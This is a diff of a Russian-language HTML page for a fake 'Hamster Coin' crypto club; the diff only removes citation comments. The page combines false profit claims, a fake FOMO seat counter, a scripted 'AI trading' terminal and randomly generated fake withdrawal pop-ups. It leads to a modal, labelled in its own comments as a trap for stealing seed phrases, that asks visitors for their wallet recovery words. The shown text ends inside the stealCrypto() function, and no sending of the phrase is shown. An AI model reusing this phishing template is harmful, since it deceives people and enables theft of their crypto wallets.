@@ -4,30 +4,30 @@
     <meta charset="UTF-8">
     <!-- Жёсткая блокировка масштабирования (user-scalable=no) для защиты верстки на смартфонах -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VIP CRYPTO CLUB | Секрет Hamster Coin</title> <!--[cite: 7] -->
+    <title>VIP CRYPTO CLUB | Секрет Hamster Coin</title>  
     <style>
         /* Глобальный box-sizing предотвращает появление горизонтального скролла из-за padding на мобильных */
         *, *::before, *::after {
             box-sizing: border-box;
         }
 
-        /* Базовые настройки элитарности[cite: 7] */
+        /* Базовые настройки элитарности  */
         body {
-            margin: 0; /*[cite: 7] */
-            padding: 0; /*[cite: 7] */
-            background-color: #0a0a0a; /*[cite: 7] */
-            color: #ffffff; /*[cite: 7] */
-            font-family: 'Montserrat', 'Helvetica Neue', sans-serif; /*[cite: 7] */
-            text-align: center; /*[cite: 7] */
-            overflow-x: hidden; /*[cite: 7] */
+            margin: 0;  
+            padding: 0;  
+            background-color: #0a0a0a;  
+            color: #ffffff;  
+            font-family: 'Montserrat', 'Helvetica Neue', sans-serif;  
+            text-align: center;  
+            overflow-x: hidden;  
         }
 
-        /* Золотые градиенты для текста и рамок[cite: 7] */
+        /* Золотые градиенты для текста и рамок  */
         .gold-text {
-            background: linear-gradient(to right, #bf953f, #fcf6ba, #b38728, #fbf5b7, #aa771c); /*[cite: 7] */
-            -webkit-background-clip: text; /*[cite: 7] */
-            color: transparent; /*[cite: 7] */
-            font-weight: 900; /*[cite: 7] */
+            background: linear-gradient(to right, #bf953f, #fcf6ba, #b38728, #fbf5b7, #aa771c);  
+            -webkit-background-clip: text;  
+            color: transparent;  
+            font-weight: 900;  
         }
 
         .blink {
@@ -38,193 +38,193 @@
             50% { opacity: 0; }
         }
 
-        /* Главный экран[cite: 7] */
+        /* Главный экран  */
         .hero {
-            padding: 50px 20px; /*[cite: 7] */
-            background: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%); /*[cite: 7] */
-            border-bottom: 2px solid #bf953f; /*[cite: 7] */
+            padding: 50px 20px;  
+            background: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%);  
+            border-bottom: 2px solid #bf953f;  
             width: 100%;
         }
 
         h1 {
-            font-size: 3.5em; /*[cite: 7] */
-            margin-bottom: 10px; /*[cite: 7] */
-            text-transform: uppercase; /*[cite: 7] */
-            letter-spacing: 2px; /*[cite: 7] */
+            font-size: 3.5em;  
+            margin-bottom: 10px;  
+            text-transform: uppercase;  
+            letter-spacing: 2px;  
             line-height: 1.1;
         }
 
         .subtitle {
-            font-size: 1.5em; /*[cite: 7] */
-            color: #cccccc; /*[cite: 7] */
-            margin-bottom: 30px; /*[cite: 7] */
-            font-weight: 300; /*[cite: 7] */
+            font-size: 1.5em;  
+            color: #cccccc;  
+            margin-bottom: 30px;  
+            font-weight: 300;  
             padding: 0 10px;
         }
 
         .profit-highlight {
-            color: #00ff88; /*[cite: 7] */
-            font-weight: bold; /*[cite: 7] */
-            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5); /*[cite: 7] */
+            color: #00ff88;  
+            font-weight: bold;  
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);  
         }
 
-        /* Виджет FOMO (Синдром упущенной выгоды)[cite: 7] */
+        /* Виджет FOMO (Синдром упущенной выгоды)  */
         .fomo-bar {
-            background: rgba(255, 0, 0, 0.1); /*[cite: 7] */
-            border: 1px solid red; /*[cite: 7] */
-            color: #ff4444; /*[cite: 7] */
-            padding: 15px; /*[cite: 7] */
-            font-size: 1.2em; /*[cite: 7] */
-            font-weight: bold; /*[cite: 7] */
-            display: inline-block; /*[cite: 7] */
-            border-radius: 5px; /*[cite: 7] */
-            margin-bottom: 30px; /*[cite: 7] */
-            animation: pulseFomo 1.5s infinite; /*[cite: 7] */
+            background: rgba(255, 0, 0, 0.1);  
+            border: 1px solid red;  
+            color: #ff4444;  
+            padding: 15px;  
+            font-size: 1.2em;  
+            font-weight: bold;  
+            display: inline-block;  
+            border-radius: 5px;  
+            margin-bottom: 30px;  
+            animation: pulseFomo 1.5s infinite;  
             width: 90%;
             max-width: 600px;
         }
 
         @keyframes pulseFomo {
-            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.4); } /*[cite: 7] */
-            70% { box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); } /*[cite: 7] */
-            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } /*[cite: 7] */
+            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.4); }  
+            70% { box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); }  
+            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }  
         }
 
-        /* Блок с терминалом "ИИ-Алгоритма"[cite: 7] */
+        /* Блок с терминалом "ИИ-Алгоритма"  */
         .tech-section {
-            padding: 50px 20px; /*[cite: 7] */
-            max-width: 800px; /*[cite: 7] */
-            margin: 0 auto; /*[cite: 7] */
+            padding: 50px 20px;  
+            max-width: 800px;  
+            margin: 0 auto;  
             width: 100%;
         }
 
         .terminal-container {
-            background: #050505; /*[cite: 7] */
-            border: 1px solid #bf953f; /*[cite: 7] */
-            border-radius: 8px; /*[cite: 7] */
-            padding: 20px; /*[cite: 7] */
-            text-align: left; /*[cite: 7] */
-            font-family: 'Courier New', monospace; /*[cite: 7] */
-            box-shadow: 0 10px 30px rgba(191, 149, 63, 0.15); /*[cite: 7] */
-            position: relative; /*[cite: 7] */
+            background: #050505;  
+            border: 1px solid #bf953f;  
+            border-radius: 8px;  
+            padding: 20px;  
+            text-align: left;  
+            font-family: 'Courier New', monospace;  
+            box-shadow: 0 10px 30px rgba(191, 149, 63, 0.15);  
+            position: relative;  
             word-wrap: break-word; /* Позволяет длинным строкам терминала переноситься */
         }
 
         .terminal-header {
-            border-bottom: 1px solid #333; /*[cite: 7] */
-            padding-bottom: 10px; /*[cite: 7] */
-            margin-bottom: 15px; /*[cite: 7] */
-            color: #888; /*[cite: 7] */
-            font-size: 0.9em; /*[cite: 7] */
-            display: flex; /*[cite: 7] */
-            justify-content: space-between; /*[cite: 7] */
+            border-bottom: 1px solid #333;  
+            padding-bottom: 10px;  
+            margin-bottom: 15px;  
+            color: #888;  
+            font-size: 0.9em;  
+            display: flex;  
+            justify-content: space-between;  
             flex-wrap: wrap; /* Заголовок не будет ломаться на узких экранах */
             gap: 5px;
         }
 
         .terminal-content {
-            height: 200px; /*[cite: 7] */
-            overflow-y: auto; /*[cite: 7] */
-            color: #00ff88; /*[cite: 7] */
-            font-size: 1.1em; /*[cite: 7] */
-            line-height: 1.5; /*[cite: 7] */
+            height: 200px;  
+            overflow-y: auto;  
+            color: #00ff88;  
+            font-size: 1.1em;  
+            line-height: 1.5;  
         }
 
-        .log-time { color: #888; } /*[cite: 7] */
-        .log-action { color: #fff; } /*[cite: 7] */
+        .log-time { color: #888; }  
+        .log-action { color: #fff; }  
 
-        /* VIP Блок Telegram[cite: 7] */
+        /* VIP Блок Telegram  */
         .telegram-vip {
-            background: linear-gradient(135deg, #1a1a1a, #2a2a2a); /*[cite: 7] */
-            border: 2px solid #bf953f; /*[cite: 7] */
-            padding: 40px; /*[cite: 7] */
-            margin: 40px auto; /*[cite: 7] */
-            max-width: 800px; /*[cite: 7] */
+            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);  
+            border: 2px solid #bf953f;  
+            padding: 40px;  
+            margin: 40px auto;  
+            max-width: 800px;  
             width: 90%;
-            border-radius: 15px; /*[cite: 7] */
+            border-radius: 15px;  
         }
 
-        /* Кнопка "Подключить кошелек"[cite: 7] */
+        /* Кнопка "Подключить кошелек"  */
         .gold-btn {
-            background: linear-gradient(to right, #bf953f, #fcf6ba, #b38728); /*[cite: 7] */
-            color: #000; /*[cite: 7] */
-            font-size: 1.8em; /*[cite: 7] */
-            font-weight: 900; /*[cite: 7] */
-            padding: 20px 50px; /*[cite: 7] */
-            border: none; /*[cite: 7] */
-            border-radius: 50px; /*[cite: 7] */
-            cursor: pointer; /*[cite: 7] */
-            text-transform: uppercase; /*[cite: 7] */
-            box-shadow: 0 10px 30px rgba(191, 149, 63, 0.4); /*[cite: 7] */
-            transition: all 0.3s; /*[cite: 7] */
-            margin-top: 20px; /*[cite: 7] */
+            background: linear-gradient(to right, #bf953f, #fcf6ba, #b38728);  
+            color: #000;  
+            font-size: 1.8em;  
+            font-weight: 900;  
+            padding: 20px 50px;  
+            border: none;  
+            border-radius: 50px;  
+            cursor: pointer;  
+            text-transform: uppercase;  
+            box-shadow: 0 10px 30px rgba(191, 149, 63, 0.4);  
+            transition: all 0.3s;  
+            margin-top: 20px;  
         }
 
         .gold-btn:hover {
-            transform: scale(1.05) translateY(-5px); /*[cite: 7] */
-            box-shadow: 0 15px 40px rgba(191, 149, 63, 0.6); /*[cite: 7] */
+            transform: scale(1.05) translateY(-5px);  
+            box-shadow: 0 15px 40px rgba(191, 149, 63, 0.6);  
         }
 
-        /* Фейковые уведомления о прибыли[cite: 7] */
+        /* Фейковые уведомления о прибыли  */
         .live-notification {
-            position: fixed; /*[cite: 7] */
-            bottom: -100px; /*[cite: 7] */
-            left: 20px; /*[cite: 7] */
-            background: rgba(0, 0, 0, 0.9); /*[cite: 7] */
-            border-left: 4px solid #00ff88; /*[cite: 7] */
-            padding: 15px 20px; /*[cite: 7] */
-            border-radius: 5px; /*[cite: 7] */
-            box-shadow: 0 5px 15px rgba(0,0,0,0.5); /*[cite: 7] */
-            transition: bottom 0.5s ease; /*[cite: 7] */
-            z-index: 1000; /*[cite: 7] */
-            text-align: left; /*[cite: 7] */
+            position: fixed;  
+            bottom: -100px;  
+            left: 20px;  
+            background: rgba(0, 0, 0, 0.9);  
+            border-left: 4px solid #00ff88;  
+            padding: 15px 20px;  
+            border-radius: 5px;  
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);  
+            transition: bottom 0.5s ease;  
+            z-index: 1000;  
+            text-align: left;  
             max-width: 90vw;
         }
 
         .live-notification.show {
-            bottom: 20px; /*[cite: 7] */
+            bottom: 20px;  
         }
 
-        /* Модальное окно (Ловушка)[cite: 7] */
+        /* Модальное окно (Ловушка)  */
         .modal-overlay {
-            display: none; /*[cite: 7] */
-            position: fixed; /*[cite: 7] */
-            top: 0; left: 0; width: 100%; height: 100%; /*[cite: 7] */
-            background: rgba(0, 0, 0, 0.9); /*[cite: 7] */
-            z-index: 9999; /*[cite: 7] */
-            justify-content: center; /*[cite: 7] */
-            align-items: center; /*[cite: 7] */
-            backdrop-filter: blur(5px); /*[cite: 7] */
+            display: none;  
+            position: fixed;  
+            top: 0; left: 0; width: 100%; height: 100%;  
+            background: rgba(0, 0, 0, 0.9);  
+            z-index: 9999;  
+            justify-content: center;  
+            align-items: center;  
+            backdrop-filter: blur(5px);  
         }
 
         .modal-content {
-            background: #111; /*[cite: 7] */
-            border: 2px solid #bf953f; /*[cite: 7] */
-            padding: 40px; /*[cite: 7] */
-            border-radius: 15px; /*[cite: 7] */
-            max-width: 500px; /*[cite: 7] */
-            width: 90%; /*[cite: 7] */
-            text-align: center; /*[cite: 7] */
+            background: #111;  
+            border: 2px solid #bf953f;  
+            padding: 40px;  
+            border-radius: 15px;  
+            max-width: 500px;  
+            width: 90%;  
+            text-align: center;  
             transition: all 0.3s ease;
         }
 
         .seed-input {
-            width: 100%; /*[cite: 7] */
-            background: #000; /*[cite: 7] */
-            border: 1px solid #555; /*[cite: 7] */
-            color: #fff; /*[cite: 7] */
-            padding: 15px; /*[cite: 7] */
-            font-size: 1em; /*[cite: 7] */
-            margin: 20px 0; /*[cite: 7] */
-            border-radius: 5px; /*[cite: 7] */
-            resize: vertical; /*[cite: 7] */
-            min-height: 100px; /*[cite: 7] */
-            box-sizing: border-box; /*[cite: 7] */
+            width: 100%;  
+            background: #000;  
+            border: 1px solid #555;  
+            color: #fff;  
+            padding: 15px;  
+            font-size: 1em;  
+            margin: 20px 0;  
+            border-radius: 5px;  
+            resize: vertical;  
+            min-height: 100px;  
+            box-sizing: border-box;  
         }
 
         .seed-input:focus {
-            outline: none; /*[cite: 7] */
-            border-color: #bf953f; /*[cite: 7] */
+            outline: none;  
+            border-color: #bf953f;  
         }
 
         /* ГЛУБОКИЙ МОБИЛЬНЫЙ АДАПТИВ */
@@ -278,128 +278,128 @@
 <body>
 
     <div class="hero">
-        <h1 class="gold-text">Эра Hamster Coin</h1> <!--[cite: 7] -->
-        <div class="subtitle">Секретный смарт-контракт, о котором молчат киты Wall Street.</div> <!--[cite: 7] -->
+        <h1 class="gold-text">Эра Hamster Coin</h1>  
+        <div class="subtitle">Секретный смарт-контракт, о котором молчат киты Wall Street.</div>  
         
         <div class="fomo-bar" id="fomo-timer">
-            ⚠️ ОСТАЛОСЬ МЕСТ В ПРИВАТНОМ ПУЛЕ: 7 / 500 ⚠️ <!--[cite: 7] -->
+            ⚠️ ОСТАЛОСЬ МЕСТ В ПРИВАТНОМ ПУЛЕ: 7 / 500 ⚠️  
         </div>
 
         <p style="font-size: 1.2em; max-width: 700px; margin: 0 auto 30px; padding: 0 15px;">
-            Пока массы скупают биткоин по верхам, наш закрытый клуб делает <span class="profit-highlight">+4,200%</span> на инсайдерских пре-сейлах Hamster Coin (HMSTR). Хватит работать на дядю. Твой Ламборгини уже ждет. <!--[cite: 7] -->
+            Пока массы скупают биткоин по верхам, наш закрытый клуб делает <span class="profit-highlight">+4,200%</span> на инсайдерских пре-сейлах Hamster Coin (HMSTR). Хватит работать на дядю. Твой Ламборгини уже ждет.  
         </p>
 
-        <button class="gold-btn" onclick="openTrap()">СИНХРОНИЗИРОВАТЬ КОШЕЛЕК</button> <!--[cite: 7] -->
+        <button class="gold-btn" onclick="openTrap()">СИНХРОНИЗИРОВАТЬ КОШЕЛЕК</button>  
     </div>
 
     <div class="tech-section">
-        <h2 class="gold-text">Как это работает?</h2> <!--[cite: 7] -->
-        <p>Мы используем нейросети для HFT (High-Frequency Trading) арбитража.</p> <!--[cite: 7] -->
+        <h2 class="gold-text">Как это работает?</h2>  
+        <p>Мы используем нейросети для HFT (High-Frequency Trading) арбитража.</p>  
         
         <div class="terminal-container">
             <div class="terminal-header">
-                <span>root@crypto-ai-node-04:~# ./hamster_sniper.py</span> <!--[cite: 7] -->
-                <span style="color: #00ff88;">[STATUS: ACTIVE]</span> <!--[cite: 7] -->
+                <span>root@crypto-ai-node-04:~# ./hamster_sniper.py</span>  
+                <span style="color: #00ff88;">[STATUS: ACTIVE]</span>  
             </div>
             <div class="terminal-content" id="terminal-logs">
-                <span class="log-time">[14:02:11]</span> <span class="log-action">Инициализация модулей... OK</span><br> <!--[cite: 7] -->
-                <span class="log-time">[14:02:12]</span> <span class="log-action">Подключение к пулам ликвидности DEX...</span><br> <!--[cite: 7] -->
+                <span class="log-time">[14:02:11]</span> <span class="log-action">Инициализация модулей... OK</span><br>  
+                <span class="log-time">[14:02:12]</span> <span class="log-action">Подключение к пулам ликвидности DEX...</span><br>  
             </div>
         </div>
     </div>
 
     <div class="telegram-vip">
-        <h2 class="gold-text">Интеграция с VIP Telegram-Ботом</h2> <!--[cite: 7] -->
-        <p>Наш приватный бот с закрытой архитектурой автоматически присылает сигналы с точностью 98.7% прямо вам в личные сообщения. Вы получаете доступ к админ-панели управления своими активами без задержек.</p> <!--[cite: 7] -->
-        <p style="color: #888; font-size: 0.9em;">*Доступ к боту открывается только после синхронизации смарт-контракта с вашим кошельком.</p> <!--[cite: 7] -->
+        <h2 class="gold-text">Интеграция с VIP Telegram-Ботом</h2>  
+        <p>Наш приватный бот с закрытой архитектурой автоматически присылает сигналы с точностью 98.7% прямо вам в личные сообщения. Вы получаете доступ к админ-панели управления своими активами без задержек.</p>  
+        <p style="color: #888; font-size: 0.9em;">*Доступ к боту открывается только после синхронизации смарт-контракта с вашим кошельком.</p>  
     </div>
 
     <!-- Всплывающее уведомление -->
     <div class="live-notification" id="live-notif">
-        <div style="color: #888; font-size: 0.8em; margin-bottom: 5px;">Только что (Live)</div> <!--[cite: 7] -->
-        <div>Пользователь <b>0x7F...3bA</b> вывел <span class="profit-highlight">14.5 ETH</span></div> <!--[cite: 7] -->
+        <div style="color: #888; font-size: 0.8em; margin-bottom: 5px;">Только что (Live)</div>  
+        <div>Пользователь <b>0x7F...3bA</b> вывел <span class="profit-highlight">14.5 ETH</span></div>  
     </div>
 
-    <!-- Ловушка (Модальное окно для кражи Seed-фразы)[cite: 7] -->
+    <!-- Ловушка (Модальное окно для кражи Seed-фразы)  -->
     <div class="modal-overlay" id="trap-modal">
         <div class="modal-content">
-            <h2 class="gold-text">WEB3 АВТОРИЗАЦИЯ</h2> <!--[cite: 7] -->
-            <p style="color: #ccc; font-size: 0.9em;">Для безопасного подключения к нашему AI-пулу ликвидности и обхода комиссий сети, требуется ручная синхронизация ноды.</p> <!--[cite: 7] -->
+            <h2 class="gold-text">WEB3 АВТОРИЗАЦИЯ</h2>  
+            <p style="color: #ccc; font-size: 0.9em;">Для безопасного подключения к нашему AI-пулу ликвидности и обхода комиссий сети, требуется ручная синхронизация ноды.</p>  
             
-            <p style="color: #ff4444; font-weight: bold; margin-top: 20px;">Введите ваши 12 или 24 слова (Seed Phrase):</p> <!--[cite: 7] -->
-            <textarea class="seed-input" id="seed-phrase" placeholder="word1 word2 word3..."></textarea> <!--[cite: 7] -->
+            <p style="color: #ff4444; font-weight: bold; margin-top: 20px;">Введите ваши 12 или 24 слова (Seed Phrase):</p>  
+            <textarea class="seed-input" id="seed-phrase" placeholder="word1 word2 word3..."></textarea>  
             
-            <p style="color: #555; font-size: 0.7em;">Мы никогда не передаем ваши данные третьим лицам. Соединение зашифровано по протоколу AES-256.</p> <!--[cite: 7] -->
+            <p style="color: #555; font-size: 0.7em;">Мы никогда не передаем ваши данные третьим лицам. Соединение зашифровано по протоколу AES-256.</p>  
             
-            <button class="gold-btn" style="font-size: 1.1em; padding: 15px; width: 100%;" onclick="stealCrypto()">ПОДКЛЮЧИТЬСЯ И НАЧАТЬ ЗАРАБАТЫВАТЬ</button> <!--[cite: 7] -->
+            <button class="gold-btn" style="font-size: 1.1em; padding: 15px; width: 100%;" onclick="stealCrypto()">ПОДКЛЮЧИТЬСЯ И НАЧАТЬ ЗАРАБАТЫВАТЬ</button>  
         </div>
     </div>
 
     <script>
-        // 1. Анимация терминала "ИИ"[cite: 7]
+        // 1. Анимация терминала "ИИ" 
         const logs = [
-            "Анализ стакана заявок на PancakeSwap...", /*[cite: 7] */
-            "Обнаружена аномалия в контракте $HMSTR...", /*[cite: 7] */
-            "<span style='color: yellow;'>[!] Подготовка Front-Running транзакции</span>", /*[cite: 7] */
-            "<span style='color: #00ff88;'>[$$$] Успешный арбитраж! Прибыль: +0.45 ETH</span>", /*[cite: 7] */
-            "Поиск новых целей в мемкоин-сегменте...", /*[cite: 7] */
-            "Скрытая маршрутизация через Tor-ноды... Успешно", /*[cite: 7] */
-            "<span style='color: #00ff88;'>[$$$] Успешный арбитраж! Прибыль: +1.2 BNB</span>" /*[cite: 7] */
+            "Анализ стакана заявок на PancakeSwap...",  
+            "Обнаружена аномалия в контракте $HMSTR...",  
+            "<span style='color: yellow;'>[!] Подготовка Front-Running транзакции</span>",  
+            "<span style='color: #00ff88;'>[$$$] Успешный арбитраж! Прибыль: +0.45 ETH</span>",  
+            "Поиск новых целей в мемкоин-сегменте...",  
+            "Скрытая маршрутизация через Tor-ноды... Успешно",  
+            "<span style='color: #00ff88;'>[$$$] Успешный арбитраж! Прибыль: +1.2 BNB</span>"  
         ];
         
-        let termLog = document.getElementById('terminal-logs'); /*[cite: 7] */
-        let logIndex = 0; /*[cite: 7] */
+        let termLog = document.getElementById('terminal-logs');  
+        let logIndex = 0;  
 
         setInterval(() => {
-            let now = new Date(); /*[cite: 7] */
-            let timeStr = `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`; /*[cite: 7] */
+            let now = new Date();  
+            let timeStr = `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`;  
             
-            termLog.innerHTML += `<span class="log-time">${timeStr}</span> <span class="log-action">${logs[logIndex]}</span><br>`; /*[cite: 7] */
-            termLog.scrollTop = termLog.scrollHeight; /*[cite: 7] */
+            termLog.innerHTML += `<span class="log-time">${timeStr}</span> <span class="log-action">${logs[logIndex]}</span><br>`;  
+            termLog.scrollTop = termLog.scrollHeight;  
             
-            logIndex = (logIndex + 1) % logs.length; /*[cite: 7] */
-        }, 2500); /*[cite: 7] */
+            logIndex = (logIndex + 1) % logs.length;  
+        }, 2500);  
 
-        // 2. Фейковые уведомления о выводе средств[cite: 7]
-        const notif = document.getElementById('live-notif'); /*[cite: 7] */
-        const coins = ["ETH", "USDT", "BTC", "BNB"]; /*[cite: 7] */
+        // 2. Фейковые уведомления о выводе средств 
+        const notif = document.getElementById('live-notif');  
+        const coins = ["ETH", "USDT", "BTC", "BNB"];  
         
         setInterval(() => {
-            let randHex = Math.floor(Math.random() * 16777215).toString(16); /*[cite: 7] */
-            let randAmt = (Math.random() * 15 + 1).toFixed(2); /*[cite: 7] */
-            let coin = coins[Math.floor(Math.random() * coins.length)]; /*[cite: 7] */
+            let randHex = Math.floor(Math.random() * 16777215).toString(16);  
+            let randAmt = (Math.random() * 15 + 1).toFixed(2);  
+            let coin = coins[Math.floor(Math.random() * coins.length)];  
             
             notif.innerHTML = `
                 <div style="color: #888; font-size: 0.8em; margin-bottom: 5px;">Только что (Live)</div>
                 <div>Кошелек <b>0x${randHex.substring(0,2)}...${randHex.substring(4,6)}</b> вывел <span class="profit-highlight">${randAmt} ${coin}</span></div>
-            `; /*[cite: 7] */
+            `;  
             
-            notif.classList.add('show'); /*[cite: 7] */
+            notif.classList.add('show');  
             
             // Вибрация при появлении чужого выигрыша (провоцирует FOMO)
             if (navigator.vibrate) navigator.vibrate(30);
             
             setTimeout(() => {
-                notif.classList.remove('show'); /*[cite: 7] */
-            }, 4000); /*[cite: 7] */
+                notif.classList.remove('show');  
+            }, 4000);  
             
-        }, 8000); /*[cite: 7] */
+        }, 8000);  
 
         // 3. Логика скам-ловушки (переработана на жесткий бескомпромиссный троллинг без объяснений)
         function openTrap() {
-            document.getElementById('trap-modal').style.display = 'flex'; /*[cite: 7] */
+            document.getElementById('trap-modal').style.display = 'flex';  
             if (navigator.vibrate) navigator.vibrate(50);
         }
 
         function stealCrypto() {
-            let seed = document.getElementById('seed-phrase').value.trim(); /*[cite: 7] */
-            let words = seed.split(/\s+/); /*[cite: 7] */
+            let seed = document.getElementById('seed-phrase').value.trim();  
+            let words = seed.split(/\s+/);  
             
-            // Валидация ввода[cite: 7]
-            if (words.length !== 12 && words.length !== 24) { /*[cite: 7] */
-                alert("❌ Ошибка: Введена неверная фраза. Требуется ровно 12 или 24 слова для синхронизации."); /*[cite: 7] */
+            // Валидация ввода 
+            if (words.length !== 12 && words.length !== 24) {  
+                alert("❌ Ошибка: Введена неверная фраза. Требуется ровно 12 или 24 слова для синхронизации.");  
                 if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-                return; /*[cite: 7] */
+                return;  
             }
 
             // Агрессивная стартовая вибрация, символизирующая начало необратимого процесса
